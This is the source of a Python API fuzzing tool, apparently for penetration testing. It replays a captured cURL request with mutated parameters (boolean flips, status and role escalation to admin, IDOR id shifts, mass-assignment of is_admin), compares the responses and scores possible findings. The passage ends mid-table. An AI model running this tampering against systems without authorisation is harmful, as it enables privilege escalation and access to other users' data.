#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║   Parameter Tampering Tool — cURL Edition                        ║
║   39 Mutation Categories | Business Logic + IDOR Coverage        ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
  python Parameter_Tem.py

  Place a raw cURL command in cURL.txt (same directory as this script).
  Token is auto-read from the Authorization header inside cURL.txt.
  Script will interactively ask which params to tamper and which need
  unique/random values per request (for mandatory/unique fields).

Ignored Fields (never mutated — common metadata in all APIs):
  modifiedTime, createdTime, creator, creatorId,
  lastModifier, lastModifierId

Mutation Categories:
  01  Boolean Flip        true/false, 1/0, yes/no, on/off,
                          enabled/disabled, active/inactive,
                          enable/disable, allow/deny, granted/revoked,
                          open/closed, visible/hidden, checked/unchecked,
                          locked/unlocked, published/unpublished,
                          verified/unverified, subscribed/unsubscribed,
                          show/hide, read/write, public/private,
                          paid/free, premium/basic, valid/invalid,
                          approved/pending, trusted/untrusted, +more
  02  Status/State Esc.   pending->approved, draft->published,
                          blocked->active, rejected->approved,
                          suspended->enabled, failed->success,
                          processing->completed, expired->valid, +more
  03  Role/Privilege Esc. user->admin, viewer->owner, guest->superuser,
                          member->moderator, basic->enterprise, +more
  04  Numeric Boundary    +-1, 0, -1, large, max_int32, overflow,
                          negative, float, max_uint32, min_int64
  05  UUID/GUID Tamper    random UUID x3, zeros, ones, sequential
  06  IDOR Core           id +-1/+-2/+-10/+-100, null, none, *, -1,
                          0, same-id repeated, hex, float
  07  IDOR Mass Assign.   inject owner_id, user_id, account_id,
                          created_by, assigned_to into body/query
  08  IDOR Ref Swap       swap object references between params
  09  IDOR Scope Esc.     org_id, team_id, tenant_id, workspace_id
  10  Operator Mutation   == <-> !=, < <-> >, <= <-> >=
  11  SQL Injection       quote, OR 1=1, UNION, SLEEP, comment,
                          stacked, double-quote, hash, blind
  12  XSS                 script, img onerror, svg onload, encoded,
                          js:, event handler, iframe, polyglot
  13  SSTI                Jinja2, Jinja2-OS, Twig, FreeMarker,
                          Velocity, ERB, Smarty, Tornado, Mako
  14  Path Traversal      unix, windows, encoded, null-byte,
                          double-dot, /proc, absolute, unicode
  15  Null / Empty        null, NULL, None, undefined, empty,
                          null-byte, nil, NaN, void(0)
  16  Whitespace Bypass   leading/trailing space, tab, newline, CR,
                          non-breaking space, zero-width space
  17  Case Mutation       UPPER, lower, Capitalize, MiXeD
  18  Role String Inject  &role=admin, &isAdmin=true, &scope=*, etc.
  19  Negative Logic      not_/non_/no_/un/dis prefix, !, ~
  20  Array / Multi-value  param[]=val, param[0]=val, JSON array, CSV
  21  HTTP Param Pollution duplicate param with admin/true/1/root
  22  Format String       %s, %n, %d, {0}, %(x)s, #{}, ${}
  23  Type Confusion      str->int, str->array, int->bool, JSON null
  24  Long Value / Buffer  256 / 1024 / 4096 chars
  25  Special Chars       ; | & ` $() CRLF unicode-RTL %00 // .. {}
  26  Business Logic      negative quantity, zero price, past/future
                          date, max discount, debug/bypass flags
  27  JSON Key Injection  __proto__, constructor, $where, $gt, $ne
  28  Header Injection    X-Forwarded-For, X-Original-URL, Host spoof
  29  Encoding Bypass     base64, url-double-encode, unicode escape
  30  Auth Token Tamper   empty token, modified JWT, alg:none JWT
"""

import argparse
import base64 as _b64_top
import csv
import json
import re
import shlex
import sys
import time
import urllib.parse
import uuid
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
from copy import deepcopy
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# ---------------------------------------------------------------------------
#  CONSTANTS
# ---------------------------------------------------------------------------

# Fields that are NEVER mutated — common metadata present in all API objects.
IGNORED_FIELDS = {
    "modifiedtime", "createdtime", "creator", "creatorid",
    "lastmodifier", "lastmodifierid",
}

# High-signal only — broad words like "id"/"success"/"role" caused mass FPs
# when they appeared as ordinary JSON fields in mutated responses.
SENSITIVE_KEYWORDS = [
    # privilege escalation confirmations
    "superuser", "administrator", "is_admin", "isadmin", "is_staff",
    "is_superuser", "role\":\"admin", "\"admin\":true",
    # secrets / credentials
    "password", "passwd", "api_key", "apikey", "secret_key", "private_key",
    "aws_secret", "access_token", "refresh_token",
    # PII / financial (specific)
    "ssn", "salary", "credit_card", "card_number", "cvv",
    # SSRF / cloud metadata confirmations
    "ami-id", "instance-id", "security-credentials", "computemetadata",
    "169.254.169.254", "serviceaccounttoken",
]

# Headers never offered as tamper targets (hop-by-hop / transport)
_SKIP_HEADER_PARAMS = {
    "host", "content-length", "connection", "accept-encoding",
    "transfer-encoding", "keep-alive", "proxy-connection", "upgrade",
}

# ---------------------------------------------------------------------------
#  HELPERS
# ---------------------------------------------------------------------------

def is_int(v):
    try:
        int(str(v).strip())
        return True
    except (ValueError, TypeError):
        return False

def is_numeric(v):
    try:
        float(str(v).strip())
        return True
    except (ValueError, TypeError):
        return False

def is_uuid(v):
    try:
        uuid.UUID(str(v).strip())
        return True
    except (ValueError, AttributeError):
        return False

def looks_like_id(name, value):
    id_kw = {
        "id", "uid", "user", "account", "member", "owner", "customer",
        "profile", "record", "item", "object", "ref", "key", "pk",
        "guid", "uuid", "cid", "rid", "doc", "file", "resource",
        "entity", "order", "invoice", "ticket", "post", "product",
        "payment", "transaction", "job", "task", "project", "case",
        "report", "contract", "subscription", "tenant", "org", "team",
        "workspace", "group", "role", "category", "type",
    }
    name_l = str(name).lower()
    return (
        any(k in name_l for k in id_kw)
        or name_l.endswith("_id")
        or name_l.endswith("id")
        or is_int(value)
        or is_uuid(value)
    )

def looks_like_owner_field(name):
    owner_kw = {
        "owner", "owner_id", "user_id", "userid", "created_by",
        "assigned_to", "assignee", "author", "author_id",
        "account_id", "accountid", "member_id",
    }
    return str(name).lower() in owner_kw

def looks_like_scope_field(name):
    scope_kw = {
        "org_id", "org", "organisation_id", "organization_id",
        "team_id", "tenant_id", "workspace_id", "group_id",
        "company_id", "department_id", "project_id", "client_id",
    }
    return str(name).lower() in scope_kw

def looks_like_price(name):
    price_kw = {"price", "amount", "cost", "fee", "discount", "total",
                "subtotal", "tax", "quantity", "qty", "count", "limit"}
    return any(k in str(name).lower() for k in price_kw)

def looks_like_date(name, value):
    date_kw = {"date", "time", "at", "from", "to", "start", "end",
               "expiry", "expire", "expires", "expiration", "until", "since"}
    if any(k in str(name).lower() for k in date_kw):
        return True
    v = str(value)
    return len(v) >= 10 and v[4:5] == "-" and v[7:8] == "-"

# ---------------------------------------------------------------------------
#  DIFFERENTIAL ANALYSIS ENGINE  (Burp-style)
# ---------------------------------------------------------------------------

# Dynamic tokens that vary naturally between requests — strip before diffing
_NORM_PATTERNS = [
    re.compile(r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', re.I),
    re.compile(r'\b\d{13}\b'),
    re.compile(r'\b\d{10}\b'),
    re.compile(r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*'),
    re.compile(r'"(?:requestId|traceId|correlationId|x-request-id)"\s*:\s*"[^"]*"', re.I),
    re.compile(r'"(?:createdAt|updatedAt|modifiedAt|timestamp)"\s*:\s*"?[^,}\]"]*"?', re.I),
]

def normalize_for_diff(text):
    """Strip tokens that change per-request so diff isn't thrown off by timestamps/UUIDs."""
    for pat in _NORM_PATTERNS:
        text = pat.sub('__D__', text)
    return text


# SSTI: expected eval results keyed by mutation-label prefix.
# "49" and "7777777" are removed from global LEAK_PATTERNS and checked
# only when the mutation actually sent a math-expression payload.
_SSTI_CONFIRMS = {
    "13_ssti_jinja":      ["49"],
    "13_ssti_freemarker": ["49"],
    "13_ssti_velocity":   ["49"],
    "13_ssti_erb":        ["49"],
    "13_ssti_mako":       ["49"],
    "13_ssti_tornado":    ["49"],
    "13_ssti_twig":       ["49"],
    "13_ssti_jinja_os":   ["subclasses", "__class__", "object at 0x"],
    "13_ssti_jinja_cfg":  ["secret_key", "database", "debug"],
    "13_ssti_smarty":     ["uid=", "gid=", "root"],
}

def check_ssti_confirmed(mutation_label, orig_lower, mut_lower):
    for prefix, tokens in _SSTI_CONFIRMS.items():
        if mutation_label.startswith(prefix):
            return any(t in mut_lower and t not in orig_lower for t in tokens)
    return False


# Mutation labels that send a timed-sleep payload — delta ≥ 4 s = confirmed
_TIME_DELAY_LABELS = frozenset({
    "11_sqli_sleep_mysql", "11_sqli_sleep_mssql", "11_sqli_sleep_pg",
    "11b_cmdi_sleep_unix", "11b_cmdi_sleep_win",  "11b_cmdi_ping",
})

def is_time_based_hit(mutation_label, elapsed_orig, elapsed_mut, timeout):
    if not any(mutation_label.startswith(lbl) for lbl in _TIME_DELAY_LABELS):
        return False
    delta = elapsed_mut - elapsed_orig
    # Payloads sleep 5 s → expect 4–(timeout*0.9) s delta; avoids flagging hard timeouts
    return 4.0 <= delta < (timeout * 0.9)


def detect_reflection(payload, response_text):
    """Return reflection type string if payload appears in response, else None."""
    if not payload or not response_text or len(str(payload)) < 6:
        return None
    pl = str(payload)
    rt = response_text
    try:
        import html as _html_mod
        if pl in rt:
            return f"raw:{pl[:50]}"
        if _html_mod.escape(pl) in rt:
            return "html_encoded"
        unquoted = urllib.parse.unquote(pl)
        if unquoted != pl and unquoted in rt:
            return "url_decoded"
    except Exception:
        pass
    return None


_PRIV_KEYS = frozenset({
    "admin", "role", "permission", "privilege", "is_admin", "is_staff",
    "scope", "token", "secret", "balance", "credit", "salary",
    "api_key", "password", "access_level", "tier", "plan",
})

def semantic_json_diff(orig_text, mut_text):
    """
    Deep-compare two JSON responses.
    Returns a list of evidence strings, or None if nothing notable.
    """
    try:
        o = json.loads(orig_text)
        m = json.loads(mut_text)
    except Exception:
        return None

    def _flatten(obj, prefix="", depth=0):
        out = {}
        if depth > 5:
            return out
        if isinstance(obj, dict):
            for k, v in obj.items():
                key = f"{prefix}.{k}" if prefix else k
                if isinstance(v, (dict, list)):
                    out.update(_flatten(v, key, depth + 1))
                else:
                    out[key] = v
        elif isinstance(obj, list):
            out[f"{prefix}[]"] = len(obj)
            for i, v in enumerate(obj[:5]):
                out.update(_flatten(v, f"{prefix}[{i}]", depth + 1))
        return out

    o_flat = _flatten(o)
    m_flat = _flatten(m)
    evidence = []

    # New privilege-related keys that appeared in mutated response
    new_keys = [k for k in m_flat if k not in o_flat]
    priv_new  = [k for k in new_keys if any(p in k.lower() for p in _PRIV_KEYS)]
    if priv_new:
        evidence.append(f"new_priv_fields:{','.join(priv_new[:4])}")

    # Privilege field values that changed
    for k in o_flat:
        if k in m_flat and str(o_flat[k]) != str(m_flat[k]):
            if any(p in k.lower() for p in _PRIV_KEYS):
                evidence.append(
                    f"priv_changed:{k}:{str(o_flat[k])[:30]}→{str(m_flat[k])[:30]}"
                )

    # Array grew (more records returned = possible IDOR/auth bypass)
    for k in m_flat:
        if k.endswith("[]") and k in o_flat:
            o_len, m_len = o_flat[k], m_flat[k]
            if (isinstance(m_len, int) and isinstance(o_len, int)
                    and o_len > 0 and m_len > o_len * 1.2 and m_len - o_len > 1):
                evidence.append(f"array_grew:{k.rstrip('[]')}:{o_len}→{m_len}")

    return evidence or None


def suppress_global_fp(findings):
    """
    Downgrade 'Possible' findings for mutation types that fire on >70 % of
    tested params — indicates an API-wide quirk, not a real vulnerability.
    """
    from collections import Counter
    poss_count  = Counter()
    total_count = Counter()
    for f in findings:
        key = f["mutation_type"]
        total_count[key] += 1
        if f["confidence"] == "Possible":
            poss_count[key] += 1

    suppressed = {
        k for k, total in total_count.items()
        if total >= 5 and poss_count.get(k, 0) / total > 0.70
    }

    for f in findings:
        if f["mutation_type"] in suppressed and f["confidence"] == "Possible":
            f["risk_level"] = "No Issue"
            f["confidence"] = "No Issue"
            f["evidence"]   = "[fp_suppressed:global_rate>70%] " + f.get("evidence", "")
    return findings


def infer_mutation_categories(param_name, value):
    """
    Returns a set of mutation-label prefixes that are relevant for this
    param/value combination — used for context-aware (auto) mode to skip
    irrelevant mutation categories and reduce noise.
    """
    # Defer lookup table references until after they are defined; the function
    # is only called at runtime, so forward references are fine here.
    cats = set()
    n = str(param_name).lower()
    v = str(value).strip() if value is not None else ""

    # Always include null/type confusion — universal
    cats.update({"15_null", "23_type", "15_"})

    # Boolean fields
    if v in BOOLEAN_FLIP_MAP or any(n.startswith(p) for p in
            ("is_", "has_", "can_", "should_", "allow_", "enable_")):
        cats.update({"01_bool", "19_neg"})

    # Status/state
    if v in STATUS_ESCALATION_MAP or any(k in n for k in
            ("status", "state", "stage", "phase")):
        cats.update({"02_status", "17_case"})

    # Role/privilege
    if v in ROLE_ESCALATION_MAP or any(k in n for k in
            ("role", "permission", "privilege", "tier", "plan", "scope", "access")):
        cats.update({"03_role", "18_role"})

    # Numeric ID / IDOR
    if looks_like_id(n, v):
        cats.update({"04_num", "06_idor", "07_mass", "08_idor"})

    # Header / host injection — URL, IP, host, forwarder-related fields
    if any(k in n for k in ("url", "uri", "host", "ip", "forward", "origin",
                              "referer", "callback", "webhook", "redirect")):
        cats.add("28_xff")

    # UUID
    if is_uuid(v):
        cats.update({"05_uuid", "06_idor"})

    # Scope fields
    if looks_like_scope_field(n):
        cats.update({"09_scope", "06_idor"})

    # URL/redirect → SSRF + path traversal + open redirect
    if any(k in n for k in ("url", "uri", "path", "redirect", "callback",
                              "next", "dest", "target", "src", "source",
                              "link", "href", "webhook", "endpoint")):
        cats.update({"10_ssrf", "14_path", "29_enc"})
        cats.add("32_redir")

    # String values → injection categories
    if v and not is_numeric(v) and not is_uuid(v):
        cats.update({"11_sqli", "11b_cmdi", "12_xss", "13_ssti",
                     "16_ws", "20_arr", "21_hpp", "22_fmt", "25_sc",
                     "27_proto"})
        cats.update({"33_ldap", "34_crlf", "37_xpath", "38_gql"})

    # Numeric values
    if is_numeric(v):
        cats.update({"04_num", "11_sqli", "26_biz"})

    # Price/qty → business logic
    if looks_like_price(n):
        cats.update({"26_biz", "04_num"})

    # Date fields → business logic
    if looks_like_date(n, v):
        cats.update({"26_biz"})

    # Owner fields
    if looks_like_owner_field(n):
        cats.update({"07_mass", "26_biz", "06_idor"})

    # JWT/token
    if any(k in n for k in ("token", "jwt", "auth", "bearer", "session", "key")):
        cats.update({"30_auth", "29_enc"})

    # Serialized / encoded values → deserialization
    _looks_serialized = (
        v.startswith("O:") or v.startswith("a:") or
        v.startswith("rO0") or v.startswith('{"__proto__') or
        (len(v) > 20 and re.match(r'^[A-Za-z0-9+/=]{20,}$', v))
    )
    if _looks_serialized:
        cats.add("35_deser")

    # XML-looking values → XXE
    if "<" in v or "xml" in str(param_name).lower():
        cats.add("31_xxe")

    # All string params → CRLF
    if v:
        cats.add("34_crlf")

    # Fallback for unknown string fields
    if len(cats - {"15_null", "23_type", "15_"}) == 0:
        cats.update({"11_sqli", "12_xss", "13_ssti", "16_ws", "25_sc"})

    return cats


class CsrfRefresher:
    """
    Fetches a fresh CSRF/dynamic token before injecting it into requests.
    Supports JSON-path extraction, regex extraction, and both header + body injection.
    """
    def __init__(self, url, method="GET", extract_json="", extract_re="",
                 inject_header="", inject_body_field="", interval=0,
                 base_headers=None):
        self.url               = url
        self.method            = method.upper()
        self.extract_json      = extract_json.strip()
        self.extract_re        = extract_re.strip()
        self.inject_header     = inject_header.strip()
        self.inject_body_field = inject_body_field.strip()
        self.interval          = interval   # 0 = every request
        self.base_headers      = base_headers or {}
        self._token            = None
        self._count            = 0
        self._sess             = requests.Session()
        self._sess.verify      = False

    def _fetch(self):
        try:
            resp = self._sess.request(
                self.method, self.url,
                headers=self.base_headers, timeout=10,
            )
            if self.extract_json:
                data = resp.json()
                for part in self.extract_json.lstrip("$.").split("."):
                    data = data[part]
                return str(data)
            if self.extract_re:
                m = re.search(self.extract_re, resp.text)
                if m:
                    return m.group(1)
            return resp.text.strip()[:500]
        except Exception as e:
            print(f"\n  [!] CSRF fetch error: {e}")
            return None

    def get_token(self):
        need_refresh = (
            self._token is None
            or self.interval == 0
            or (self.interval > 0 and self._count % self.interval == 0)
        )
        if need_refresh:
            self._token = self._fetch()
        self._count += 1
        return self._token

    def apply(self, entry):
        """Inject a fresh token into a CURLEntry (modifies in-place, returns entry)."""
        tok = self.get_token()
        if not tok:
            return entry
        if self.inject_header:
            entry.headers[self.inject_header] = tok
        if self.inject_body_field and isinstance(entry.body, dict):
            entry.body[self.inject_body_field] = tok
        return entry


# ---------------------------------------------------------------------------
#  LOOKUP TABLES
# ---------------------------------------------------------------------------

# Cat 01 - Boolean flip pairs
BOOLEAN_FLIP_MAP = {
    "true": "false",          "false": "true",
    "True": "False",          "False": "True",
    "TRUE": "FALSE",          "FALSE": "TRUE",
    "1": "0",                 "0": "1",
    "yes": "no",              "no": "yes",
    "Yes": "No",              "No": "Yes",
    "YES": "NO",              "NO": "YES",
    "on": "off",              "off": "on",
    "On": "Off",              "Off": "On",
    "ON": "OFF",              "OFF": "ON",
    "enabled": "disabled",    "disabled": "enabled",
    "Enabled": "Disabled",    "Disabled": "Enabled",
    "ENABLED": "DISABLED",    "DISABLED": "ENABLED",
    "active": "inactive",     "inactive": "active",
    "Active": "Inactive",     "Inactive": "Active",
    "ACTIVE": "INACTIVE",     "INACTIVE": "ACTIVE",
    "enable": "disable",      "disable": "enable",
    "Enable": "Disable",      "Disable": "Enable",
    "ENABLE": "DISABLE",      "DISABLE": "ENABLE",
    "allow": "deny",          "deny": "allow",
    "Allow": "Deny",          "Deny": "Allow",
    "ALLOW": "DENY",          "DENY": "ALLOW",
    "allowed": "denied",      "denied": "allowed",
    "Allowed": "Denied",      "Denied": "Allowed",
    "ALLOWED": "DENIED",      "DENIED": "ALLOWED",
    "granted": "revoked",     "revoked": "granted",
    "Granted": "Revoked",     "Revoked": "Granted",
    "GRANTED": "REVOKED",     "REVOKED": "GRANTED",
    "open": "closed",         "closed": "open",
    "Open": "Closed",         "Closed": "Open",
    "OPEN": "CLOSED",         "CLOSED": "OPEN",
    "visible": "hidden",      "hidden": "visible",
    "Visible": "Hidden",      "Hidden": "Visible",
    "VISIBLE": "HIDDEN",      "HIDDEN": "VISIBLE",
    "checked": "unchecked",   "unchecked": "checked",
    "Checked": "Unchecked",   "Unchecked": "Checked",
    "locked": "unlocked",     "unlocked": "locked",
    "Locked": "Unlocked",     "Unlocked": "Locked",
    "LOCKED": "UNLOCKED",     "UNLOCKED": "LOCKED",
    "published": "unpublished", "unpublished": "published",
    "Published": "Unpublished", "Unpublished": "Published",
    "verified": "unverified", "unverified": "verified",
    "Verified": "Unverified", "Unverified": "Verified",
    "subscribed": "unsubscribed", "unsubscribed": "subscribed",
    "Subscribed": "Unsubscribed", "Unsubscribed": "Subscribed",
    "show": "hide",           "hide": "show",
    "Show": "Hide",           "Hide": "Show",
    "read": "write",          "write": "read",
    "Read": "Write",          "Write": "Read",
    "public": "private",      "private": "public",
    "Public": "Private",      "Private": "Public",
    "PUBLIC": "PRIVATE",      "PRIVATE": "PUBLIC",
    "paid": "free",           "free": "paid",
    "Paid": "Free",           "Free": "Paid",
    "premium": "basic",       "basic": "premium",
    "Premium": "Basic",       "Basic": "Premium",
    "valid": "invalid",       "invalid": "valid",
    "Valid": "Invalid",       "Invalid": "Valid",
    "approved": "pending",    "pending": "approved",
    "Approved": "Pending",    "Pending": "Approved",
    "APPROVED": "PENDING",    "PENDING": "APPROVED",
    "trusted": "untrusted",   "untrusted": "trusted",
    "Trusted": "Untrusted",   "Untrusted": "Trusted",
    "confirmed": "unconfirmed", "unconfirmed": "confirmed",
    "Confirmed": "Unconfirmed", "Unconfirmed": "Confirmed",
    "accepted": "rejected",   "rejected": "accepted",
    "Accepted": "Rejected",   "Rejected": "Accepted",
    "completed": "incomplete", "incomplete": "completed",
    "Completed": "Incomplete", "Incomplete": "Completed",
    "required": "optional",   "optional": "required",
    "editable": "readonly",   "readonly": "editable",
    "Editable": "Readonly",   "Readonly": "Editable",
    "admin": "user",          "user": "admin",
    "Admin": "User",          "User": "Admin",
    "is_admin": "is_user",    "is_user": "is_admin",
}

# Cat 02 - Status escalation
STATUS_ESCALATION_MAP = {
    "pending":     ["approved", "active", "published", "verified", "completed"],
    "Pending":     ["Approved", "Active", "Published", "Verified", "Completed"],
    "PENDING":     ["APPROVED", "ACTIVE", "PUBLISHED", "VERIFIED", "COMPLETED"],
    "draft":       ["published", "active", "approved", "live"],
    "Draft":       ["Published", "Active", "Approved", "Live"],
    "DRAFT":       ["PUBLISHED", "ACTIVE", "APPROVED", "LIVE"],
    "review":      ["approved", "published", "active"],
    "in_review":   ["approved", "published", "active"],
    "under_review":["approved", "published", "active"],
    "rejected":    ["approved", "active", "pending"],
    "Rejected":    ["Approved", "Active", "Pending"],
    "REJECTED":    ["APPROVED", "ACTIVE", "PENDING"],
    "suspended":   ["active", "approved", "enabled"],
    "Suspended":   ["Active", "Approved", "Enabled"],
    "blocked":     ["active", "allowed", "enabled"],
    "Blocked":     ["Active", "Allowed", "Enabled"],
    "banned":      ["active", "allowed", "enabled"],
    "Banned":      ["Active", "Allowed", "Enabled"],
    "deactivated": ["active", "activated", "enabled"],
    "Deactivated": ["Active", "Activated", "Enabled"],
    "inactive":    ["active", "enabled", "approved"],
    "Inactive":    ["Active", "Enabled", "Approved"],
    "INACTIVE":    ["ACTIVE", "ENABLED", "APPROVED"],
    "expired":     ["active", "valid", "approved"],
    "Expired":     ["Active", "Valid", "Approved"],
    "cancelled":   ["active", "approved", "pending"],
    "Cancelled":   ["Active", "Approved", "Pending"],
    "canceled":    ["active", "approved", "pending"],
    "closed":      ["open", "active", "approved"],
    "Closed":      ["Open", "Active", "Approved"],
    "locked":      ["unlocked", "active", "open"],
    "Locked":      ["Unlocked", "Active", "Open"],
    "unpublished": ["published", "active", "live"],
    "Unpublished": ["Published", "Active", "Live"],
    "disabled":    ["enabled", "active", "on"],
    "Disabled":    ["Enabled", "Active", "On"],
    "DISABLED":    ["ENABLED", "ACTIVE", "ON"],
    "hidden":      ["visible", "public", "active"],
    "Hidden":      ["Visible", "Public", "Active"],
    "private":     ["public", "shared", "open"],
    "Private":     ["Public", "Shared", "Open"],
    "PRIVATE":     ["PUBLIC", "SHARED", "OPEN"],
    "unverified":  ["verified", "approved", "trusted"],
    "Unverified":  ["Verified", "Approved", "Trusted"],
    "processing":  ["completed", "approved", "success"],
    "Processing":  ["Completed", "Approved", "Success"],
    "failed":      ["success", "approved", "completed"],
    "Failed":      ["Success", "Approved", "Completed"],
    "error":       ["success", "ok", "approved"],
    "Error":       ["Success", "Ok", "Approved"],
    "scheduled":   ["active", "running", "completed"],
    "queued":      ["running", "completed", "approved"],
    "waiting":     ["approved", "active", "running"],
    "on_hold":     ["active", "approved", "running"],
    "paused":      ["active", "running", "enabled"],
    "Paused":      ["Active", "Running", "Enabled"],
    "archived":    ["active", "published", "open"],
    "Archived":    ["Active", "Published", "Open"],
    "deleted":     ["active", "restored", "published"],
    "Deleted":     ["Active", "Restored", "Published"],
    "unconfirmed": ["confirmed", "verified", "approved"],
    "Unconfirmed": ["Confirmed", "Verified", "Approved"],
    "incomplete":  ["completed", "approved", "verified"],
    "Incomplete":  ["Completed", "Approved", "Verified"],
    "free":        ["premium", "paid", "pro", "enterprise"],
    "Free":        ["Premium", "Paid", "Pro", "Enterprise"],
    "trial":       ["premium", "paid", "active", "enterprise"],
    "Trial":       ["Premium", "Paid", "Active", "Enterprise"],
    "unknown":     ["approved", "verified", "active"],
    "Unknown":     ["Approved", "Verified", "Active"],
}

# Cat 03 - Role escalation
ROLE_ESCALATION_MAP = {
    "user":         ["admin", "superuser", "root", "moderator", "staff", "manager"],
    "User":         ["Admin", "Superuser", "Root", "Moderator", "Staff", "Manager"],
    "USER":         ["ADMIN", "SUPERUSER", "ROOT", "MODERATOR", "STAFF"],
    "viewer":       ["editor", "admin", "owner", "superuser"],
    "Viewer":       ["Editor", "Admin", "Owner", "Superuser"],
    "guest":        ["user", "admin", "staff", "moderator"],
    "Guest":        ["User", "Admin", "Staff", "Moderator"],
    "member":       ["admin", "owner", "superuser", "moderator"],
    "Member":       ["Admin", "Owner", "Superuser", "Moderator"],
    "customer":     ["admin", "staff", "manager", "owner"],
    "Customer":     ["Admin", "Staff", "Manager", "Owner"],
    "editor":       ["admin", "superuser", "owner"],
    "Editor":       ["Admin", "Superuser", "Owner"],
    "author":       ["admin", "editor", "superuser"],
    "Author":       ["Admin", "Editor", "Superuser"],
    "operator":     ["admin", "superuser", "root"],
    "Operator":     ["Admin", "Superuser", "Root"],
    "readonly":     ["readwrite", "admin", "superuser"],
    "read":         ["write", "admin", "readwrite"],
    "basic":        ["premium", "admin", "pro", "enterprise"],
    "Basic":        ["Premium", "Admin", "Pro", "Enterprise"],
    "standard":     ["premium", "admin", "enterprise"],
    "Standard":     ["Premium", "Admin", "Enterprise"],
    "free":         ["premium", "pro", "enterprise", "admin"],
    "Free":         ["Premium", "Pro", "Enterprise", "Admin"],
    "subscriber":   ["admin", "moderator", "owner"],
    "Subscriber":   ["Admin", "Moderator", "Owner"],
    "support":      ["admin", "superuser"],
    "Support":      ["Admin", "Superuser"],
    "agent":        ["admin", "superuser", "manager"],
    "Agent":        ["Admin", "Superuser", "Manager"],
    "analyst":      ["admin", "manager", "superuser"],
    "Analyst":      ["Admin", "Manager", "Superuser"],
    "contributor":  ["admin", "owner", "superuser"],
    "Contributor":  ["Admin", "Owner", "Superuser"],
    "collaborator": ["admin", "owner"],
    "Collaborator": ["Admin", "Owner"],
    "developer":    ["admin", "superuser", "owner"],
    "Developer":    ["Admin", "Superuser", "Owner"],
    "tester":       ["admin", "developer", "superuser"],
    "Tester":       ["Admin", "Developer", "Superuser"],
    "intern":       ["employee", "admin", "manager"],
    "Intern":       ["Employee", "Admin", "Manager"],
    "1":  ["0", "2", "99", "100", "999"],
    "2":  ["1", "0", "99", "100", "999"],
    "3":  ["1", "0", "99", "100", "999"],
    "10": ["1", "0", "99", "100"],
}

# ---------------------------------------------------------------------------
#  CORE MUTATION GENERATOR  (30 categories)
# ---------------------------------------------------------------------------

def get_mutations(param_name, value, all_params=None, categories=None):
    """Return [(label, mutated_value), ...] for all mutation categories."""
    v = str(value) if value is not None else ""
    now = datetime.utcnow()
    mutations = []

    # 01 Boolean Flip ---------------------------------------------------
    if v in BOOLEAN_FLIP_MAP:
        mutations.append(("01_bool_flip", BOOLEAN_FLIP_MAP[v]))
    for prefix in ("is_", "has_", "can_", "should_", "allow_", "enable_"):
        if str(param_name).lower().startswith(prefix):
            if v in ("true", "True", "1", "yes", "Yes"):
                mutations.append(("01_bool_neg_prefix", "false"))
            elif v in ("false", "False", "0", "no", "No"):
                mutations.append(("01_bool_neg_prefix", "true"))

    # 02 Status Escalation ----------------------------------------------
    if v in STATUS_ESCALATION_MAP:
        for target in STATUS_ESCALATION_MAP[v]:
            mutations.append((f"02_status_{target}", target))

    # 03 Role Escalation ------------------------------------------------
    if v in ROLE_ESCALATION_MAP:
        for target in ROLE_ESCALATION_MAP[v]:
            mutations.append((f"03_role_{target}", target))

    # 04 Numeric Boundary -----------------------------------------------
    if is_int(v):
        iv = int(v)
        mutations += [
            ("04_num_plus1",     str(iv + 1)),
            ("04_num_minus1",    str(iv - 1)),
            ("04_num_zero",      "0"),
            ("04_num_neg1",      "-1"),
            ("04_num_large",     "9999999"),
            ("04_num_max_i32",   "2147483647"),
            ("04_num_overflow",  "2147483648"),
            ("04_num_max_u32",   "4294967295"),
            ("04_num_min_i64",   "-9223372036854775808"),
            ("04_num_neg_large", "-9999999"),
            ("04_num_float",     str(float(iv) + 0.1)),
        ]
    elif is_numeric(v):
        mutations += [
            ("04_num_zero",      "0"),
            ("04_num_neg1",      "-1"),
            ("04_num_large",     "9999999"),
            ("04_num_neg_large", "-9999999"),
            ("04_num_max_i32",   "2147483647"),
        ]

    # 05 UUID / GUID Tampering ------------------------------------------
    if is_uuid(v):
        mutations += [
            ("05_uuid_rand1",  str(uuid.uuid4())),
            ("05_uuid_rand2",  str(uuid.uuid4())),
            ("05_uuid_rand3",  str(uuid.uuid4())),
            ("05_uuid_zeros",  "00000000-0000-0000-0000-000000000000"),
            ("05_uuid_ones",   "ffffffff-ffff-ffff-ffff-ffffffffffff"),
            ("05_uuid_seq1",   "00000000-0000-0000-0000-000000000001"),
        ]

    # 06 IDOR Core ------------------------------------------------------
    if looks_like_id(param_name, v) and is_int(v):
        iv = int(v)
        for delta in [-100, -10, -2, -1, 1, 2, 10, 100]:
            nv = str(iv + delta)
            if nv != v:
                mutations.append((f"06_idor_{delta:+d}", nv))
        mutations += [
            ("06_idor_zero",    "0"),
            ("06_idor_neg1",    "-1"),
            ("06_idor_null",    "null"),
            ("06_idor_none",    "None"),
            ("06_idor_star",    "*"),
            ("06_idor_max",     "999999999"),
            ("06_idor_float",   str(iv) + ".0"),
            ("06_idor_neg_max", "-999999999"),
            ("06_idor_hex",     hex(iv)),
            ("06_idor_quoted",  '"' + v + '"'),
        ]

    # 07 IDOR Mass Assignment — only on ID/owner-like params (avoids N× duplicate battery)
    if looks_like_id(param_name, v) or looks_like_owner_field(param_name):
        mass_assign_targets = [
            ("07_mass_owner_id",    "owner_id",     "0"),
            ("07_mass_user_id",     "user_id",      "0"),
            ("07_mass_account_id",  "account_id",   "0"),
            ("07_mass_created_by",  "created_by",   "0"),
            ("07_mass_assigned_to", "assigned_to",  "0"),
            ("07_mass_is_admin",    "is_admin",     "true"),
            ("07_mass_role",        "role",         "admin"),
            ("07_mass_is_staff",    "is_staff",     "true"),
            ("07_mass_is_verified", "is_verified",  "true"),
            ("07_mass_is_approved", "is_approved",  "true"),
            ("07_mass_plan",        "plan",         "enterprise"),
